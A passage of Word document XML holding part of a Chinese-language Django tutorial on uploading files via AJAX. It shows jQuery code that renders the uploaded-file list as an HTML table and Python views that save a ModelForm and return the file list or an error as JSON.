    <w:p w14:paraId="0674A56B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  content = content +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03ADB770" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  '&lt;tr&gt;&lt;td&gt;' +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EA5559" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  "&lt;a href= ' " +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC9237B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  item['url'] +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C795150" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  " '&gt; " +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F121A90" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  item['url'] +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4E29F8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  '&lt;/a&gt;&lt;/td&gt;&lt;td&gt;' +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FDC428" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  item['size'] +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3220DA5B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  '&lt;/td&gt;&lt;td&gt;' +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2210C077" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                  item['upload_method'] +</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC2D1FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                   '&lt;/td&gt;&lt;tr&gt;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9D7CD9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D0373D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             content = content + "&lt;/tbody&gt;";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBD47B5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             $('#result').html(content);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C696FB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1362C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">           },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D02F2C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B012647" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0738CBA1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF6186A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  &lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0A10B6" w14:textId="28E89703" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2FEB03" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C57A435" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Ajax代码部分代码请注意不要随意变动，尤其评论//部分要特别注意。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49438874" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ED6A614" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>负责处理Ajax请求的视图ajax_upload方法如下所示。该方法将ajax发过来的数据于FileUploadModelForm先结合，然后直接调用form.save方法存储，最后以json格式返回更新过的文件清单。如何用户上传文件不符合要求，返回错误信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAE223C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#file_upload/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D36FD73" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Upload File with ModelForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5753EE83" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def ajax_form_upload(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CDD159" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    form = FileUploadModelForm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B54EA61" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'file_upload/ajax_upload_form.html', {'form': form,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C93A6F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                            'heading': 'File Upload with AJAX'})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765D00C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40AD20E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># handling AJAX requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B05DBE3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def ajax_upload(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49594032" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347A9184" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = FileUploadModelForm(data=request.POST, files=request.FILES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1DF943" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601933BB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            form.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28732A3D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            # Obtain the latest file list</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFEC1C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            files = File.objects.all().order_by('-id')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3711F02C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            data = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E05FBCF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            for file in files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F362602" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                data.append({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6073E7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "url": file.file.url,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135B5338" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "size": filesizeformat(file.file.size),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232602D4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "upload_method": file.upload_method,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D45DC78" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    })</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E18BC4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return JsonResponse(data, safe=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DAE0CD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF97322" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            data = {'error_msg': "Only jpg, pdf and xlsx files are allowed."}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB7796D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return JsonResponse(data)</w:t>
      </w:r>
    </w:p>
